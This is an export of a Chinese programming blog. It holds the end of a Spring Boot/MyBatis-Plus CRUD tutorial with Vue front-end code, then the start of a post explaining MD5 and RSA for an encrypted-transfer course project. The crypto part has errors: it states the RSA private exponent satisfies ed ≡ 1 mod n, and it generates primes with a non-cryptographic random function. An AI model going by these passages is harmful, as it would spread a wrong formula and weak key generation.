    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span> </span>&#123;
        <span class="hljs-keyword">return</span> bookDao.selectById(id);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span> </span>&#123;
        IPage&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);
        <span class="hljs-keyword">return</span> bookDao.selectPage(page, <span class="hljs-keyword">null</span>);
    &#125;
&#125;
</code></pre>

<p>使用mybatisplus的自带接口快速开发</p>
<p>业务层接口快速开发</p>
<pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IBookService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">IService</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;
    <span class="hljs-comment">//添加非通用操作API接口</span>
&#125;</code></pre>

<p>​        业务层接口实现类快速开发，关注继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类。</p>
<pre><code class="hljs JAVA"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ServiceImpl</span>&lt;<span class="hljs-title">BookDao</span>, <span class="hljs-title">Book</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">IBookService</span> </span>&#123;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> BookDao bookDao;
	<span class="hljs-comment">//添加非通用操作API</span>
&#125;</code></pre>

<p>​        如果感觉MyBatisPlus提供的功能不足以支撑你的使用需要（其实是一定不能支撑的，因为需求不可能是通用的），在原始接口基础上接着定义新的API接口就行了，此处不再说太多了，就是自定义自己的操作了，但是不要和已有的API接口名冲突即可。</p>
<p><strong>总结</strong></p>
<ol>
<li>使用通用接口（ISerivce<T>）快速开发Service</T></li>
<li>使用通用实现类（ServiceImpl&lt;M,T&gt;）快速开发ServiceImpl</li>
<li>可以在通用接口基础上做功能重载或功能追加</li>
<li>注意重载时不要覆盖原始操作，避免原始提供的功能丢失</li>
</ol>
<h3 id="表现层开发"><a href="#表现层开发" class="headerlink" title="表现层开发"></a>表现层开发</h3><p>表现层接口如下：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">//使用restful接口约束</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController2</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IBookService service;

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> service.list();
    &#125;


    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;

        System.out.println(book);
        <span class="hljs-keyword">return</span> service.save(book);
    &#125;

    <span class="hljs-meta">@PutMapping</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
        wrapper.eq(Book::getId, book.getId());
        <span class="hljs-keyword">return</span> service.update(book,wrapper);
    &#125;

    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;
        <span class="hljs-keyword">return</span> service.removeById(id);
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;
        <span class="hljs-keyword">return</span> service.getById(id);
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
        Page&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);
        <span class="hljs-keyword">return</span> service.page(page);
    &#125;
&#125;</code></pre>

<p>使用postman测试各个接口是否可以正常工作</p>
<p>getById功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231257883.png" alt="image-20220418231257883"></p>
<p>分页功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231337888.png" alt="image-20220418231337888"></p>
<p>save()功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231557326.png" alt="image-20220418231557326"></p>
<p>删除功能delete()</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418232140801.png" alt="image-20220418232140801"></p>
<p>==消息一致性处理== </p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span> </span>&#123;
    <span class="hljs-keyword">private</span> Boolean flag;   <span class="hljs-comment">//表示本次请求是否成功</span>
    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">//本次请求返回的数据</span>
&#125;</code></pre>

<p>使用消息一致处理后获取的数据格式</p>
<pre><code class="hljs java">&#123;
    <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-keyword">true</span>,
    <span class="hljs-string">&quot;data&quot;</span>:&#123;
        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;计算机理论&quot;</span>,
        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Spring实战 第5版&quot;</span>,
        <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;Spring入门经典教程&quot;</span>
    &#125;
&#125;</code></pre>

<p>修改表现层代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;


<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.controller.utils.R;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IBookService service;

    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getAll</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize, Book book)</span></span>&#123;
        IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book);
        <span class="hljs-keyword">if</span>(currentPage &gt; bookIPage.getPages()) &#123;
            bookIPage = service.getAll((<span class="hljs-keyword">int</span>) bookIPage.getPages(), pageSize, book);
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">null</span> != bookIPage, bookIPage);
    &#125;


    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.save(book));
    &#125;

    <span class="hljs-meta">@PutMapping</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
        wrapper.eq(Book::getId, book.getId());
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.update(book,wrapper));
    &#125;

    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.removeById(id));
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">true</span>, service.getById(id));
    &#125;

<span class="hljs-comment">//    @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
<span class="hljs-comment">//    public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123;</span>
<span class="hljs-comment">//        Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize);</span>
<span class="hljs-comment">//        Page&lt;Book&gt; page = service.page(ipage);</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//        if(currentPage &gt; page.getCurrent())&#123;</span>
<span class="hljs-comment">//            ipage.setCurrent(page.getPages());</span>
<span class="hljs-comment">//            page = service.page(ipage);</span>
<span class="hljs-comment">//        &#125;</span>
<span class="hljs-comment">//        return new R(true, page);</span>
<span class="hljs-comment">//    &#125;</span>
&#125;
</code></pre>

<h3 id="前端页面代码"><a href="#前端页面代码" class="headerlink" title="前端页面代码"></a>前端页面代码</h3><h4 id="分页查询所有数据和条件查询"><a href="#分页查询所有数据和条件查询" class="headerlink" title="分页查询所有数据和条件查询"></a>分页查询所有数据和条件查询</h4><p>页面数据模型定义</p>
<pre><code class="hljs java">data:&#123;
	dataList: [],              <span class="hljs-comment">//当前页要展示的列表数据</span>
	pagination: &#123;              <span class="hljs-comment">//分页相关模型数据</span>
                currentPage: <span class="hljs-number">1</span>,<span class="hljs-comment">//当前页码</span>
                pageSize:<span class="hljs-number">10</span>,   <span class="hljs-comment">//每页显示的记录数</span>
                total:<span class="hljs-number">0</span>,       <span class="hljs-comment">//总记录数</span>
                name:<span class="hljs-string">&#x27;&#x27;</span>,
                type:<span class="hljs-string">&#x27;&#x27;</span>,
                description:<span class="hljs-string">&#x27;&#x27;</span>
    &#125;
&#125;</code></pre>

<p>异步请求代码</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">getAll</span>(<span class="hljs-params"></span>)</span> &#123;
    param = <span class="hljs-string">&quot;?name=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.name;
    param = param + <span class="hljs-string">&quot;&amp;type=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.type;
    param = param + <span class="hljs-string">&quot;&amp;description=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.description;

    <span class="hljs-comment">// console.log(param);</span>
    axios.get(<span class="hljs-string">&quot;/books/&quot;</span>+<span class="hljs-built_in">this</span>.pagination.currentPage + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">this</span>.pagination.pageSize + param).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;
        <span class="hljs-built_in">this</span>.dataList = res.data.data.records;
        <span class="hljs-built_in">this</span>.pagination.total = res.data.data.total;
        <span class="hljs-built_in">this</span>.pagination.currentPage = res.data.data.current;
        <span class="hljs-built_in">this</span>.pagination.pagesize = res.data.data.size;
    &#125;);
&#125;</code></pre>

<p>在钩子函数中执行该方法</p>
<pre><code class="hljs java"><span class="hljs-comment">//钩子函数，VUE对象初始化完成后自动执行</span>
created() &#123;
    <span class="hljs-keyword">this</span>.getAll();
&#125;,</code></pre>

<h4 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h4><p>添加数据的窗口弹出控制</p>
<p>数据模型</p>
<pre><code class="hljs js">dialogFormVisible: <span class="hljs-literal">false</span>,<span class="hljs-comment">//添加表单是否可见</span>
formData</code></pre>

<p>对话框控制函数</p>
<pre><code class="hljs java"><span class="hljs-comment">//弹出添加窗口</span>
handleCreate() &#123;
    <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">true</span>;
    <span class="hljs-keyword">this</span>.resetForm();
&#125;,</code></pre>

<p>重置表单功能</p>
<pre><code class="hljs java"><span class="hljs-comment">//重置表单</span>
resetForm() &#123;
    <span class="hljs-keyword">this</span>.formData = &#123;&#125;;
&#125;,</code></pre>

<p>添加功能</p>
<pre><code class="hljs java">handleAdd () &#123;
    axios.post(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">false</span>;
            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;添加成功！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;添加失败！&quot;</span>);
        &#125;
    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
        <span class="hljs-keyword">this</span>.getAll();
    &#125;)
&#125;</code></pre>

<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><pre><code class="hljs java"><span class="hljs-comment">// 删除</span>
handleDelete(row) &#123;
    axios.delete(<span class="hljs-string">&quot;/books/&quot;</span> + row.id).then((res)=&gt;&#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;删除成功！&quot;</span>);
            <span class="hljs-keyword">this</span>.getAll();
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;删除失败！&quot;</span>);
        &#125;
    &#125;)
&#125;,</code></pre>

<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><pre><code class="hljs java"><span class="hljs-comment">//弹出编辑窗口</span>
handleUpdate(row) &#123;
    <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">true</span>;
    <span class="hljs-keyword">this</span>.formData = row;
&#125;,

<span class="hljs-comment">//修改</span>
handleEdit() &#123;
    axios.put(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">false</span>;
            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;修改成功！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;修改失败！&quot;</span>);
        &#125;
    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
        <span class="hljs-keyword">this</span>.getAll();
    &#125;)
&#125;,</code></pre>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA_AES</title>
    <url>/2021/07/21/RSA-AES/</url>
    <content><![CDATA[<p>西北工业大学夏令营考核项目</p>
<span id="more"></span>

<h1 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h1><blockquote>
<p>（ 1） 用 RSA 算法实现两个主机之间的密钥分发， 分发的密钥为 0x 01 23 45 67 或 0x 01 23 45 67 89 AB CD EF；<br>（ 2） 用分发的密钥和 AES 加密算法， 实现两个主机之间的加密数据传输， 测试数据是“NPU-SCS” 和其他自己构造的 7 条消息；<br>（ 3） 以上 2 个步骤在程序中自动执行完， 无手动参与； 程序可以在同一台主机上完成， 但数据必须经过网络传输（ 可以本地发送， 本地接收）；<br>（ 4） 密码算法必须是源码编译得到， 不能直接用编译过的库文件；RSA 和 AES 算法的源码可以来自于网络或其他任意渠道；<br>（ 5） 以上算法选择国密算法实现更佳；<br>（ 6） 用 Python 或 C/C++语言实现程序， 写出技术开发文档， 录制一段不超过 8 分钟的演示视频。 提交技术开发文档、 演示视频。     </p>
</blockquote>
<h1 id="二、需求分析"><a href="#二、需求分析" class="headerlink" title="二、需求分析"></a>二、需求分析</h1><p>设传输文件的双方分别为Alice和Bob，Alice为传输文件的一方，Bob作为接收文件的一方。</p>
<p>首先确定使用Windows的socket套接字实现网络通信，Bob作为服务器一方，等待Alice的连接，然后Alice向Bob发送数据。</p>
<p>安全需求如下:</p>
<ul>
<li><p>使用RSA算法生成Alice和Bob使用的公钥，并计算出私钥后分发，为后续的数字签名（MD5）和对称加密密钥（AES）的加解密做准备。</p>
</li>
<li><p>因为是在公共信道中传输数据，所以可能存在攻击者冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。</p>
</li>
<li><p>在确认彼此身份后需要将文件通过公共信道传输，但是可能存在数据，所以需要对文件内容加密，考虑到加密速度问题，所以采用对称加密算法（AES）。</p>
</li>
<li><p>采用对称加密算法需要密钥，而这里使用的密钥的为<code>0x12345678</code>。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以不传输此次加密使用的密钥，提高安全性和效率。</p>
</li>
<li><p>当Bob收到对应的密钥并解密密文后，需要向Alice发送一个确认收到的消息，防止截断攻击，确认消息也要使用到第一步使用的签名算法。</p>
</li>
</ul>
<h1 id="三、设计原理"><a href="#三、设计原理" class="headerlink" title="三、设计原理"></a>三、设计原理</h1><p>从上面的需求分析可以知道，整个程序需要用的MD5，RSA，AES算法，最后使用socket编程实现通信。</p>
<h2 id="3-1-MD5"><a href="#3-1-MD5" class="headerlink" title="3.1 MD5"></a>3.1 MD5</h2><p>​        MD5是hash函数的一种，而 Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入(又叫做预映射)通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是说，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是是将任意长度的输入变换为固定长度的输出的不可逆的单向密码体制。</p>
<p>​        MD5(Message-Digest Algorithm,信息摘要算法)，是由美国著名密码学家Rivest设计的一种密码散列函数，可以将长度小于264比特的消息，按512比特的分组单位进行处理，输出一个128比特的消息摘要。</p>
<p>MD5 算法输入不定长度信息，输出固定长度 128-bits 的算法。经过程序流程，生成四个 32位数据，最后联合起来成为一个 128-bits 散列。基本方式有求余、取余、调整长度、与链接变量进行循环运算， 得出结果。基本流程如下图所示：  </p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095352078.png" alt="image-20210714095352078"></p>
<h3 id="3-1-1-消息填充"><a href="#3-1-1-消息填充" class="headerlink" title="3.1.1 消息填充"></a>3.1.1 消息填充</h3><ul>
<li>使消息长度模512=448如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512，填充方法：第1比特为1，其余全部为0</li>
<li>将消息长度转换为64比特的数值，如果长度超过64比特所能表示的数据长度，值保留最后64比特添加到填充数据后面，使数据为512比特的整数倍</li>
<li>512比特按32比特分为16组</li>
</ul>
<p>处理过程如下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095700191.png" alt="image-20210714095700191" style="zoom: 80%;">

<h3 id="3-1-2-初始化链接变量"><a href="#3-1-2-初始化链接变量" class="headerlink" title="3.1.2 初始化链接变量"></a>3.1.2 初始化链接变量</h3><p>使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意的是，寄存器的值要转化为小端序。</p>
<pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">1234567</span>
<span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>x<span class="hljs-number">89</span>ABCDEF
<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xFEDCBA<span class="hljs-number">98</span>
<span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>x<span class="hljs-number">76543210</span></code></pre>

<h3 id="3-1-3-分组处理"><a href="#3-1-3-分组处理" class="headerlink" title="3.1.3 分组处理"></a>3.1.3 分组处理</h3><ul>
<li>由4轮组成，521bit的消息分组Mi被均分为16个分组，参与每轮16步函数运算，即每轮包括16个步骤。每步的输入是4个32bit的链接变量和1个32bit的消息子分组，输出为32位值</li>
<li>经过4轮共64步后，得到的4个寄存器值分别与输入链接变量进行模加，即得到此次分组处理的输出链接变量</li>
<li>4轮操作之前，先将前一分组的链接变量(A、B、C、D的值)复制到备用记录单元，以便执行最后的模加操作</li>
</ul>
<p>处理过程如下图</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714095845995.png" alt="image-20210714095845995" style="zoom:80%;">

<h3 id="3-1-4-步函数"><a href="#3-1-4-步函数" class="headerlink" title="3.1.4  步函数"></a>3.1.4  步函数</h3><p>MD5每轮包含16步，每轮的步函数相同，即使用同一个非线性函数，而不同轮的步函数使用的非线性函数是不同的，即四轮使用4个不同的非线性函数。设X、Y、Z是3个32比特的输入变量，输出是一个32比特变量，则这4个非线性函数F、G、H和I定义为：</p>
<pre><code class="hljs tp">F(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=(<span class="hljs-keyword">X</span>&amp;<span class="hljs-keyword">Y</span>)|((~<span class="hljs-keyword">X</span>)&amp;<span class="hljs-keyword">Z</span>)
G(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=(<span class="hljs-keyword">X</span>&amp;<span class="hljs-keyword">Z</span>)|(<span class="hljs-keyword">Y</span>&amp;(~<span class="hljs-keyword">Z</span>))
H(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=<span class="hljs-keyword">X</span>^<span class="hljs-keyword">Y</span>^<span class="hljs-keyword">Z</span>
I(<span class="hljs-keyword">X</span>,<span class="hljs-keyword">Y</span>,<span class="hljs-keyword">Z</span>)=<span class="hljs-keyword">Y</span>^(<span class="hljs-keyword">X</span>|(~<span class="hljs-keyword">Z</span>))</code></pre>

<p>MD5步函数的执行过程：</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100312140.png" alt="image-20210714100312140" style="zoom: 67%;">

<p>伪随机常数 T[ i ]，可以消除输入数据的规律性，i为弧度，1 ≤ i ≤ 64，方框代表取整数部分</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210714100450860.png" alt="image-20210714100450860"></p>
<p>轮函数先取向量(A、B、C、D)中的后3个作一次非线性函数运算，所得的结果一次加上第1个变量，32bit消息子分组和1个伪随机常数，再将所得的结果循环左移指定位数，并加上(A、B、C、D)的第二个变量，最后把新值赋给向量中的第1个变量。</p>
<h3 id="3-1-5-主循环"><a href="#3-1-5-主循环" class="headerlink" title="3.1.5 主循环"></a>3.1.5 主循环</h3><p>​    算法具体步骤如图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100555756.png" alt="image-20210714100555756"></p>
<h3 id="正确性验证"><a href="#正确性验证" class="headerlink" title="正确性验证"></a>正确性验证</h3><blockquote>
<p><strong>在线网站</strong>：<a href="https://md5jiami.bmcx.com/">https://md5jiami.bmcx.com/</a></p>
<p><strong>处理字符串:</strong> I love cumt very much           </p>
</blockquote>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100739874.png" alt="image-20210714100739874"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714100744577.png" alt="image-20210714100744577"></p>
<h2 id="3-2-RSA"><a href="#3-2-RSA" class="headerlink" title="3.2 RSA"></a>3.2 RSA</h2><p>​        在Diffie和Hellman提出公钥密码体制的设想后，Merkle和Hellman首先共同提出MH背包公钥加密体制，随后Rivest、Shamir、Adleman联合提出RSA公钥加密体制。RSA虽晚于MH背包公钥加密体制，但它是第一个安全、实用的公钥加密算法，已成为国际标准。</p>
<pre><code>RSA的基础是数论的欧拉定理，它的安全性依赖于大整数因子分解的困难性。且因为加解密次序可换，RSA公钥佳美体制既可用于加密，也可用于设计数字签名体制。</code></pre><p><strong>RSA算法原理</strong></p>
<p>​    安全性基于大素数因子分解的困难问题，整体算法流程简单清晰，分为如下三个部分：</p>
<p>（1）密钥生成算法： </p>
<p>​    ① 选取两个保密的大素数𝑝和𝑞，满足𝑝 ≠ 𝑞，计算𝑛 = 𝑝 × 𝑞, 𝜑(𝑛) = (𝑝 − 1)(𝑞 − 1), 𝜑(𝑛) 为𝑛的欧拉函数。 </p>
<p>​    ② 随机选取整数𝑒, 满足1 &lt; 𝑒 &lt; 𝜑(𝑛)且gcd(𝑒, 𝜑(𝑛)) = 1，即𝑒与𝜑(𝑛)互素。 </p>
<p>​    ③ 计算𝑑, 满足𝑒𝑑 ≡ 1(𝑚𝑜𝑑 (𝑛))，则公钥为(𝑒, 𝑛), 私钥为𝑑。 </p>
<p>（2）加密 对明文进行比特串分组，使每个分组十进制小于𝑛 , 然后对每个分组𝑚(0 ≤ 𝑚 &lt; 𝑛),计算 𝑐 = 𝑚𝑒 (𝑚𝑜𝑑 𝑛)，则得到密文 c。 </p>
<p>（3）解密  对于密文𝑐(0 ≤ c &lt; n), 有𝑚 = 𝑐𝑑 (𝑚𝑜𝑑 𝑛)， 即可得到明文m。</p>
<h3 id="3-2-1-大素数生成"><a href="#3-2-1-大素数生成" class="headerlink" title="3.2.1 大素数生成"></a>3.2.1 大素数生成</h3><p>要去寻找一个任意的大素数是很困难的事,但是可是先随机生成一个大奇数,再通过多次素性检验检测是否为宿舍,如果多次检测都为素数则可确定为素数.</p>
<h4 id="随机生成大奇数"><a href="#随机生成大奇数" class="headerlink" title="随机生成大奇数"></a>随机生成大奇数</h4><p>此算法可以根据需要生成固定位数的数,当生成奇数后,会通过素性检验,如果通过检查,则素数生成成功</p>
<pre><code class="hljs python"><span class="hljs-comment"># 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genPrime</span>(<span class="hljs-params">b=<span class="hljs-number">1024</span></span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># 设置死循环直到生成素数才退出</span>
        res = <span class="hljs-string">&quot;1&quot;</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b-<span class="hljs-number">2</span>):
            res += <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))
        res += <span class="hljs-string">&quot;1&quot;</span>                              <span class="hljs-comment"># 最后一位为1保证为奇数</span>
